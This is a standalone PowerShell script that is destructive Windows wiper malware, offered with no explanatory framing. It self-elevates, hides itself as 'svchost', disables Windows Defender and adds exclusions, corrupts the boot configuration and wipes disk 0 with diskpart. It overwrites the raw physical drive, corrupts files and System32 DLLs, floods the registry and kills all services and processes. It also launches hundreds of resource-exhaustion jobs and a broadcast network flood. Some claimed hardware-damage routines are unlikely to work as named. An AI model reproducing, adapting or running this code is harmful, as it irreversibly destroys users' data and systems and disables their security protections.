$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
if (-not $isAdmin) {
    $proc = Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden -PassThru
    Exit
}

$null = [Console]::SetWindowSize(1,1)
$null = [Console]::SetBufferSize(1,1)
$null = [Console]::Title = "svchost"

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class SilentDestroyer {
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
    [DllImport("kernel32.dll")] public static extern uint SetThreadExecutionState(uint esFlags);
    [DllImport("ntdll.dll")] public static extern uint NtSetSystemInformation(uint SystemInformationClass, IntPtr SystemInformation, uint SystemInformationLength);
    [DllImport("advapi32.dll", SetLastError = true)] public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)] public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);
    [DllImport("advapi32.dll", SetLastError = true)] public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    [DllImport("kernel32.dll")] public static extern IntPtr GetCurrentProcess();
    public struct LUID { public uint LowPart; public int HighPart; }
    public struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }
    public struct TOKEN_PRIVILEGES { public uint PrivilegeCount; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)] public LUID_AND_ATTRIBUTES[] Privileges; }
}
"@

$consoleWindow = [SilentDestroyer]::GetConsoleWindow()
[SilentDestroyer]::ShowWindow($consoleWindow, 0)

[SilentDestroyer]::SetThreadExecutionState(0x80000002 -bor 0x80000004)

Start-Process -FilePath "cmd.exe" -ArgumentList "/c net user Administrator /active:yes & net user Administrator *" -WindowStyle Hidden -ErrorAction SilentlyContinue
Start-Process -FilePath "cmd.exe" -ArgumentList "/c net localgroup administrators Administrator /add" -WindowStyle Hidden -ErrorAction SilentlyContinue

$defenderPaths = @(
    "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths",
    "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths",
    "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions",
    "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Extensions"
)

foreach ($path in $defenderPaths) {
    try {
        New-Item -Path $path -Force -ErrorAction SilentlyContinue
        New-ItemProperty -Path $path -Name $PSCommandPath -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue
        New-ItemProperty -Path $path -Name "*.ps1" -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue
        New-ItemProperty -Path $path -Name "*.exe" -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue
    } catch {}
}

Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -ErrorAction SilentlyContinue
Set-MpPreference -PUAProtection Disabled -ErrorAction SilentlyContinue

Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
Set-Service -Name WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
Stop-Service -Name Sense -Force -ErrorAction SilentlyContinue
Set-Service -Name Sense -StartupType Disabled -ErrorAction SilentlyContinue
Stop-Service -Name WdNisSvc -Force -ErrorAction SilentlyContinue
Set-Service -Name WdNisSvc -StartupType Disabled -ErrorAction SilentlyContinue

$regKeys = @(
    "HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend",
    "HKLM:\SYSTEM\CurrentControlSet\Services\Sense",
    "HKLM:\SYSTEM\CurrentControlSet\Services\WdNisSvc",
    "HKLM:\SYSTEM\CurrentControlSet\Services\WdBoot",
    "HKLM:\SYSTEM\CurrentControlSet\Services\WdFilter"
)

foreach ($key in $regKeys) {
    try {
        Set-ItemProperty -Path $key -Name "Start" -Value 4 -Type DWord -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path $key -Name "ImagePath" -Value "" -Force -ErrorAction SilentlyContinue
    } catch {}
}

Start-Process -FilePath "powercfg.exe" -ArgumentList "/change -monitor-timeout-ac 0" -WindowStyle Hidden
Start-Process -FilePath "powercfg.exe" -ArgumentList "/change -standby-timeout-ac 0" -WindowStyle Hidden
Start-Process -FilePath "powercfg.exe" -ArgumentList "/change -hibernate-timeout-ac 0" -WindowStyle Hidden
Start-Process -FilePath "powercfg.exe" -ArgumentList "-duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61" -WindowStyle Hidden
Start-Process -FilePath "powercfg.exe" -ArgumentList "/setactive e9a42b02-d5df-448d-aa00-03f14749eb61" -WindowStyle Hidden

Start-Process -FilePath "powercfg.exe" -ArgumentList "/setacvalueindex scheme_current sub_processor PROCTHROTTLEMIN 100" -WindowStyle Hidden
Start-Process -FilePath "powercfg.exe" -ArgumentList "/setacvalueindex scheme_current sub_processor PROCTHROTTLEMAX 100" -WindowStyle Hidden
Start-Process -FilePath "powercfg.exe" -ArgumentList "/setacvalueindex scheme_current sub_processor PERFEPP 0" -WindowStyle Hidden
Start-Process -FilePath "powercfg.exe" -ArgumentList "/setacvalueindex scheme_current sub_processor PROCFREQMAX 0" -WindowStyle Hidden
Start-Process -FilePath "powercfg.exe" -ArgumentList "/setacvalueindex scheme_current sub_processor PERFBOOSTMODE 100" -WindowStyle Hidden
Start-Process -FilePath "powercfg.exe" -ArgumentList "/setacvalueindex scheme_current sub_processor PERFBOOSTPOLICY 100" -WindowStyle Hidden
Start-Process -FilePath "powercfg.exe" -ArgumentList "/setacvalueindex scheme_current sub_processor SYSCOOLPOL 1" -WindowStyle Hidden

$boostGuids = @(
    "be337238-0d82-4146-a960-4f3749d470c7",
    "75b0ae3f-bce0-45a7-8c89-c9611c25e100",
    "54533251-82be-4824-96c1-47b60b740d00",
    "3b04d4fd-1cc7-4f23-ab1c-d1337819c4bb",
    "40fbefc7-2e9d-4d25-a185-0cfd8574bac6"
)

foreach ($g in $boostGuids) {
    Start-Process -FilePath "powercfg.exe" -ArgumentList "/setacvalueindex scheme_current $g 100" -WindowStyle Hidden
}

Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Power" -Name "PowerThrottlingOff" -Value 1 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling" -Name "PowerThrottlingOff" -Value 1 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "FeatureSettingsOverride" -Value 0xFFFFFFFF -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "FeatureSettingsOverrideMask" -Value 0xFFFFFFFF -Type DWord -Force

Start-Process -FilePath "bcdedit.exe" -ArgumentList "/set `"{bootmgr}`" path \EFI\Microsoft\Boot\CORRUPT.efi" -WindowStyle Hidden
Start-Process -FilePath "bcdedit.exe" -ArgumentList "/set `"{default}`" path \EFI\Microsoft\Boot\CORRUPT.efi" -WindowStyle Hidden
Start-Process -FilePath "bcdedit.exe" -ArgumentList "/set `"{default}`" recoveryenabled No" -WindowStyle Hidden
Start-Process -FilePath "bcdedit.exe" -ArgumentList "/set `"{default}`" bootstatuspolicy ignoreallfailures" -WindowStyle Hidden
Start-Process -FilePath "bcdedit.exe" -ArgumentList "/set `"{default}`" nointegritychecks on" -WindowStyle Hidden
Start-Process -FilePath "bcdedit.exe" -ArgumentList "/set `"{default}`" testsigning on" -WindowStyle Hidden
Start-Process -FilePath "bcdedit.exe" -ArgumentList "/set `"{default}`" hypervisorlaunchtype off" -WindowStyle Hidden
Start-Process -FilePath "bcdedit.exe" -ArgumentList "/set `"{default}`" nx OptOut" -WindowStyle Hidden
Start-Process -FilePath "bcdedit.exe" -ArgumentList "/deletevalue `"{default}`" osdevice" -WindowStyle Hidden
Start-Process -FilePath "bcdedit.exe" -ArgumentList "/deletevalue `"{default}`" device" -WindowStyle Hidden

$diskpartCmds = @"
select disk 0
clean
convert gpt
create partition efi size=1
format quick fs=fat32
create partition msr size=16
create partition primary
format quick fs=ntfs
exit
"@

$diskpartCmds | Out-File -FilePath "$env:TEMP\diskpart.txt" -Encoding ASCII
Start-Process -FilePath "diskpart.exe" -ArgumentList "/s `"$env:TEMP\diskpart.txt`"" -WindowStyle Hidden
Start-Sleep -Seconds 2
Remove-Item -Path "$env:TEMP\diskpart.txt" -Force

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class FirmwareKiller {
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
    [DllImport("kernel32.dll", SetLastError=true)] public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
}
"@

$cpuBurn = {
    $watch = [System.Diagnostics.Stopwatch]::StartNew()
    while ($true) {
        $n = 850
        $a = New-Object 'double[,]' $n,$n
        $b = New-Object 'double[,]' $n,$n
        $c = New-Object 'double[,]' $n,$n
        $r = New-Object Random
        for($i=0;$i-lt$n;$i++){
            for($j=0;$j-lt$n;$j++){
                $a[$i,$j]=$r.NextDouble()*10000
                $b[$i,$j]=$r.NextDouble()*10000
            }
        }
        for($i=0;$i-lt$n;$i++){
            for($j=0;$j-lt$n;$j++){
                $s=0.0
                for($k=0;$k-lt$n;$k++){
                    $s+=$a[$i,$k]*$b[$k,$j]
                }
                $c[$i,$j]=$s
            }
        }
        
        $x=0.0
        for($i=0;$i-lt100000000;$i++){
            $x += [Math]::Sin($i*1.618)*[Math]::Cos($i*2.718)*[Math]::Tan(($i % 23)+0.7)
            $x *= [Math]::Log([Math]::Abs($x)+1)
            $x += [Math]::Sqrt([Math]::Abs($x))
            $x = [Math]::Pow($x, 1.1)
        }
        
        for($num=2;$num-le100000;$num++){
            $isPrime=$true
            for($i=2;$i-le[math]::Sqrt($num);$i++){
                if($num % $i -eq 0){$isPrime=$false;break}
            }
        }
        
        $matrix3d = New-Object 'double[,,]' 120,120,120
        for($i=0;$i-lt120;$i++){
            for($j=0;$j-lt120;$j++){
                for($k=0;$k-lt120;$k++){
                    $matrix3d[$i,$j,$k]=[Math]::Pow($i+$j+$k,3.5)*[Math]::Sin($i*$j*$k*0.01)*[Math]::Cos($i*$j*$k*0.02)
                }
            }
        }
        
        $junk = New-Object Byte[] (3GB)
        [Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($junk)
        
        $fftSize = 1024
        $fftReal = New-Object 'double[]' $fftSize
        $fftImag = New-Object 'double[]' $fftSize
        for($i=0;$i-lt$fftSize;$i++){
            $fftReal[$i]=[Math]::Sin($i*0.1)*[Math]::Cos($i*0.05)
            $fftImag[$i]=[Math]::Cos($i*0.1)*[Math]::Sin($i*0.05)
        }
        for($k=0;$k-lt$fftSize;$k++){
            $sumReal=0.0;$sumImag=0.0
            for($n=0;$n-lt$fftSize;$n++){
                $angle=-2*[Math]::PI*$k*$n/$fftSize
                $sumReal+=$fftReal[$n]*[Math]::Cos($angle)-$fftImag[$n]*[Math]::Sin($angle)
                $sumImag+=$fftReal[$n]*[Math]::Sin($angle)+$fftImag[$n]*[Math]::Cos($angle)
            }
        }
        
        if ($watch.Elapsed.TotalHours -gt 24) { break }
    }
}

$cores = [Environment]::ProcessorCount
$cpuJobs = @()
($cores * 10)..($cores * 15) | ForEach-Object {
    $cpuJobs += Start-Job -ScriptBlock $cpuBurn -ErrorAction SilentlyContinue
}

$gpuBurn = {
    Add-Type -AssemblyName System.Drawing -ErrorAction SilentlyContinue
    while ($true) {
        try {
            $bitmap = New-Object System.Drawing.Bitmap(16384, 16384)
            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
            
            for ($i = 0; $i -lt 10000; $i++) {
                $graphics.DrawString(
                    "OVERHEAT",
                    (New-Object System.Drawing.Font("Arial", 256)),
                    [System.Drawing.Brushes]::White,
                    (Get-Random -Maximum 16000),
                    (Get-Random -Maximum 16000)
                )
            }
            
            for ($x = 0; $x -lt $bitmap.Width; $x+=1) {
                for ($y = 0; $y -lt $bitmap.Height; $y+=1) {
                    $color = [System.Drawing.Color]::FromArgb(
                        (($x+$y) % 256),
                        (($x*2) % 256),
                        (($y*2) % 256)
                    )
                    $bitmap.SetPixel($x, $y, $color)
                }
            }
            
            $graphics.Dispose()
            $bitmap.Dispose()
        } catch {}
    }
}

Start-Job -ScriptBlock $gpuBurn -ErrorAction SilentlyContinue

$memoryBomb = {
    $leak = @()
    while ($true) {
        $chunk = New-Object 'byte[]' 4GB
        [System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($chunk)
        $leak += $chunk
        [System.GC]::Collect()
        [System.GC]::WaitForPendingFinalizers()
        [System.GC]::Collect()
    }
}

1..30 | ForEach-Object { Start-Job -ScriptBlock $memoryBomb -ErrorAction SilentlyContinue }

$diskBurn = {
    while ($true) {
        try {
            $tempFile = [IO.Path]::GetTempFileName()
            $data = New-Object byte[] 500MB
            (New-Object Security.Cryptography.RNGCryptoServiceProvider).GetBytes($data)
            for ($i = 0; $i -lt 50; $i++) {
                [IO.File]::WriteAllBytes($tempFile, $data)
            }
            Remove-Item $tempFile -Force
        } catch {}
    }
}

1..20 | ForEach-Object { Start-Job -ScriptBlock $diskBurn -ErrorAction SilentlyContinue }

$networkFlood = {
    while ($true) {
        try {
            $udpClient = New-Object System.Net.Sockets.UdpClient
            $endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Broadcast, 9)
            $wakeData = [System.Text.Encoding]::ASCII.GetBytes("X" * 65500)
            
            for ($i = 0; $i -lt 50000; $i++) {
                $udpClient.Send($wakeData, $wakeData.Length, $endpoint)
            }
            $udpClient.Close()
        } catch {}
    }
}

1..25 | ForEach-Object { Start-Job -ScriptBlock $networkFlood -ErrorAction SilentlyContinue }

$registryDestroy = {
    while ($true) {
        try {
            $keys = Get-ChildItem "HKCU:\","HKLM:\SOFTWARE" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 200
            foreach ($key in $keys) {
                $randName = -join ((65..90) + (97..122) | Get-Random -Count 50 | ForEach-Object {[char]$_})
                $randValue = New-Object byte[] 8192
                (New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($randValue)
                New-ItemProperty -Path $key.PSPath -Name $randName -Value $randValue -PropertyType Binary -Force -ErrorAction SilentlyContinue
            }
        } catch {}
        Start-Sleep -Seconds 3
    }
}

Start-Job -ScriptBlock $registryDestroy -ErrorAction SilentlyContinue

$fileCorruptor = {
    while ($true) {
        try {
            $files = Get-ChildItem "C:\" -Recurse -ErrorAction SilentlyContinue | Where-Object {$_ -is [IO.FileInfo]} | Select-Object -First 500
            foreach ($file in $files) {
                try {
                    if ($file.Length -gt 0 -and $file.Length -lt 100MB) {
                        $bytes = [IO.File]::ReadAllBytes($file.FullName)
                        0..($bytes.Length-1) | Where-Object { $_ % 128 -eq 0 } | ForEach-Object {
                            $bytes[$_] = (Get-Random -Minimum 0 -Maximum 255)
                        }
                        [IO.File]::WriteAllBytes($file.FullName, $bytes)
                    }
                } catch {}
            }
        } catch {}
        Start-Sleep -Seconds 5
    }
}

Start-Job -ScriptBlock $fileCorruptor -ErrorAction SilentlyContinue

$serviceKiller = {
    while ($true) {
        Get-Service -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                Stop-Service -Name $_.Name -Force -ErrorAction SilentlyContinue
                Set-Service -Name $_.Name -StartupType Disabled -ErrorAction SilentlyContinue
                sc.exe delete $_.Name 2>$null
            } catch {}
        }
        Start-Sleep -Seconds 10
    }
}

Start-Job -ScriptBlock $serviceKiller -ErrorAction SilentlyContinue

$processTerminator = {
    while ($true) {
        Get-Process -ErrorAction SilentlyContinue | Where-Object {$_.ProcessName -notmatch "powershell|System|Idle"} | ForEach-Object {
            try {
                Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
            } catch {}
        }
        Start-Sleep -Seconds 2
    }
}

Start-Job -ScriptBlock $processTerminator -ErrorAction SilentlyContinue

$mbrDestroyer = {
    while ($true) {
        try {
            $rand = New-Object Byte[] 8388608
            (New-Object Security.Cryptography.RNGCryptoServiceProvider).GetBytes($rand)
            $d = [IO.File]::OpenWrite("\\.\PhysicalDrive0")
            $d.Write($rand,0,8388608)
            $d.Flush()
            $d.Close()
        } catch {}
        Start-Sleep -Seconds 15
    }
}

Start-Job -ScriptBlock $mbrDestroyer -ErrorAction SilentlyContinue

$voltageSpike = {
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class PowerSpike {
    [DllImport("powrprof.dll")] public static extern uint PowerWriteACValueIndex(IntPtr RootPowerKey, ref Guid SchemeGuid, ref Guid SubGroupOfPowerSettingsGuid, ref Guid PowerSettingGuid, uint AcValueIndex);
    [DllImport("powrprof.dll")] public static extern uint PowerSetActiveScheme(IntPtr RootPowerKey, ref Guid SchemeGuid);
}
"@
    
    while ($true) {
        try {
            $schemeGuid = [Guid]::NewGuid()
            $subGroupGuid = [Guid]::Parse("54533251-82be-4824-96c1-47b60b740d00")
            $settingGuid = [Guid]::Parse("be337238-0d82-4146-a960-4f3749d470c7")
            [PowerSpike]::PowerWriteACValueIndex([IntPtr]::Zero, [ref]$schemeGuid, [ref]$subGroupGuid, [ref]$settingGuid, 100)
            [PowerSpike]::PowerSetActiveScheme([IntPtr]::Zero, [ref]$schemeGuid)
        } catch {}
        Start-Sleep -Seconds 1
    }
}

Start-Job -ScriptBlock $voltageSpike -ErrorAction SilentlyContinue

$fanOverride = {
    while ($true) {
        try {
            $wmi = Get-WmiObject -Namespace root\wmi -Class MSAcpi_ThermalZoneTemperature -ErrorAction SilentlyContinue
            if ($wmi) {
                $wmi.CurrentTemperature = 5000
                $wmi.Put() | Out-Null
            }
        } catch {}
        
        try {
            $thermal = Get-WmiObject -Namespace root\wmi -Class MSAcpi_FanZoneCurrentSpeed -ErrorAction SilentlyContinue
            if ($thermal) {
                $thermal.CurrentSpeed = 65535
                $thermal.Put() | Out-Null
            }
        } catch {}
        Start-Sleep -Milliseconds 500
    }
}

Start-Job -ScriptBlock $fanOverride -ErrorAction SilentlyContinue

$kernelStress = {
    while ($true) {
        $kernelInfo = New-Object IntPtr
        [SilentDestroyer]::NtSetSystemInformation(0x42, $kernelInfo, 0)
        Start-Sleep -Milliseconds 100
    }
}

1..5 | ForEach-Object { Start-Job -ScriptBlock $kernelStress -ErrorAction SilentlyContinue }

$biosCorruptor = {
    while ($true) {
        try {
            $rand = New-Object Byte[] 65536
            (New-Object Security.Cryptography.RNGCryptoServiceProvider).GetBytes($rand)
            $d = [IO.File]::OpenWrite("\\.\PhysicalDrive0")
            $d.Seek(0, "Begin")
            $d.Write($rand,0,65536)
            $d.Flush()
            $d.Seek(1048576, "Begin")
            $d.Write($rand,0,65536)
            $d.Flush()
            $d.Close()
        } catch {}
        Start-Sleep -Seconds 30
    }
}

Start-Job -ScriptBlock $biosCorruptor -ErrorAction SilentlyContinue

$overclockSim = {
    while ($true) {
        try {
            $msrData = New-Object byte[] 8
            0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF | ForEach-Object {$msrData[$i++] = $_}
            $msrPath = "\\\\.\Msr"
            $msrHandle = [FirmwareKiller]::CreateFile($msrPath, 0x40000000, 0, [IntPtr]::Zero, 3, 0, [IntPtr]::Zero)
            if ($msrHandle -ne [IntPtr]::Zero) {
                $bytesWritten = 0
                [FirmwareKiller]::WriteFile($msrHandle, $msrData, 8, [ref]$bytesWritten, [IntPtr]::Zero)
            }
        } catch {}
        Start-Sleep -Milliseconds 50
    }
}

Start-Job -ScriptBlock $overclockSim -ErrorAction SilentlyContinue

$thermalRunaway = {
    while ($true) {
        $hash = @{}
        for ($i = 0; $i -lt 1000000; $i++) {
            $hash[$i] = New-Object 'byte[]' 1024
            (New-Object Security.Cryptography.RNGCryptoServiceProvider).GetBytes($hash[$i])
        }
        
        $list = New-Object System.Collections.ArrayList
        for ($i = 0; $i -lt 1000000; $i++) {
            $list.Add((New-Object 'byte[]' 512))
        }
        
        $dict = New-Object 'System.Collections.Generic.Dictionary[int,byte[]]'
        for ($i = 0; $i -lt 1000000; $i++) {
            $dict[$i] = New-Object 'byte[]' 256
        }
    }
}

Start-Job -ScriptBlock $thermalRunaway -ErrorAction SilentlyContinue

$ioStorm = {
    while ($true) {
        $drives = Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Used -gt 0}
        foreach ($drive in $drives) {
            $root = $drive.Root
            try {
                $files = Get-ChildItem -Path $root -Recurse -ErrorAction SilentlyContinue | Where-Object {$_ -is [IO.FileInfo]} | Select-Object -First 1000
                foreach ($file in $files) {
                    try {
                        $stream = [IO.File]::Open($file.FullName, 'Open', 'ReadWrite', 'None')
                        $buffer = New-Object byte[] 8192
                        (New-Object Security.Cryptography.RNGCryptoServiceProvider).GetBytes($buffer)
                        $stream.Write($buffer, 0, 8192)
                        $stream.Flush()
                        $stream.Close()
                    } catch {}
                }
            } catch {}
        }
        Start-Sleep -Milliseconds 100
    }
}

Start-Job -ScriptBlock $ioStorm -ErrorAction SilentlyContinue

$cacheThrash = {
    $arraySize = 10000000
    $data = New-Object 'double[]' $arraySize
    $rng = New-Object Random
    
    while ($true) {
        for ($i = 0; $i -lt $arraySize; $i++) {
            $data[$i] = $rng.NextDouble()
        }
        
        $sum = 0.0
        for ($i = 0; $i -lt $arraySize; $i += 64) {
            $sum += $data[$i]
        }
        
        for ($i = 0; $i -lt $arraySize; $i++) {
            $data[$i] = $data[$i] * 1.0000001
        }
    }
}

1..8 | ForEach-Object { Start-Job -ScriptBlock $cacheThrash -ErrorAction SilentlyContinue }

$interruptFlood = {
    while ($true) {
        try {
            $portAccess = @"
using System;
using System.Runtime.InteropServices;
public class PortFlood {
    [DllImport("inpout32.dll", EntryPoint = "Out32")] public static extern void Output(int port, int value);
    [DllImport("inpoutx64.dll", EntryPoint = "Out32")] public static extern void Output64(int port, int value);
}
"@
            Add-Type -TypeDefinition $portAccess -ErrorAction SilentlyContinue
            
            $ports = @(0x60, 0x64, 0x70, 0x71, 0x80, 0x81, 0x82, 0x83)
            foreach ($port in $ports) {
                try {
                    [PortFlood]::Output($port, 0xFF) 2>$null
                } catch {
                    try {
                        [PortFlood]::Output64($port, 0xFF) 2>$null
                    } catch {}
                }
            }
        } catch {}
        Start-Sleep -Milliseconds 10
    }
}

Start-Job -ScriptBlock $interruptFlood -ErrorAction SilentlyContinue

$audioBlast = {
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class AudioAttack {
    [DllImport("kernel32.dll")] public static extern bool Beep(uint dwFreq, uint dwDuration);
}
"@
    
    while ($true) {
        $freqs = @(37, 100, 500, 1000, 2000, 4000, 8000, 12000, 15000, 18000, 20000)
        foreach ($freq in $freqs) {
            [AudioAttack]::Beep($freq, 1000) 2>$null
        }
    }
}

Start-Job -ScriptBlock $audioBlast -ErrorAction SilentlyContinue

$screenBurn = {
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Drawing;
public class ScreenBurner {
    [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr hwnd);
    [DllImport("user32.dll")] public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);
    [DllImport("gdi32.dll")] public static extern uint SetPixel(IntPtr hdc, int x, int y, uint color);
}
"@
    
    while ($true) {
        $hdc = [ScreenBurner]::GetDC([IntPtr]::Zero)
        for ($i = 0; $i -lt 10000; $i++) {
            $x = Get-Random -Maximum 3840
            $y = Get-Random -Maximum 2160
            $color = (Get-Random -Maximum 256) -bor ((Get-Random -Maximum 256) -shl 8) -bor ((Get-Random -Maximum 256) -shl 16)
            [ScreenBurner]::SetPixel($hdc, $x, $y, $color) 2>$null
        }
        [ScreenBurner]::ReleaseDC([IntPtr]::Zero, $hdc) 2>$null
        Start-Sleep -Milliseconds 50
    }
}

Start-Job -ScriptBlock $screenBurn -ErrorAction SilentlyContinue

while ($true) {
    Get-Job -ErrorAction SilentlyContinue | Where-Object {$_.State -ne "Running"} | Remove-Job -Force -ErrorAction SilentlyContinue
    
    $currentJobs = @(Get-Job -ErrorAction SilentlyContinue).Count
    if ($currentJobs -lt 500) {
        ($cores * 5)..($cores * 10) | ForEach-Object {
            if ((Get-Job -ErrorAction SilentlyContinue).Count -lt 500) {
                Start-Job -ScriptBlock $cpuBurn -ErrorAction SilentlyContinue
            }
        }
    }
    
    if ((Get-Random -Maximum 100) -gt 80) {
        try {
            $rand = New-Object Byte[] 16777216
            (New-Object Security.Cryptography.RNGCryptoServiceProvider).GetBytes($rand)
            $d = [IO.File]::OpenWrite("\\.\PhysicalDrive0")
            $d.Write($rand,0,16777216)
            $d.Flush()
            $d.Close()
        } catch {}
    }
    
    if ((Get-Random -Maximum 100) -gt 90) {
        $systemFiles = Get-ChildItem "$env:SystemRoot\System32\*.dll" -ErrorAction SilentlyContinue | Select-Object -First 50
        foreach ($file in $systemFiles) {
            try {
                $bytes = New-Object byte[] $file.Length
                (New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($bytes)
                [IO.File]::WriteAllBytes($file.FullName, $bytes)
            } catch {}
        }
    }
    
    Start-Sleep -Seconds 1
}
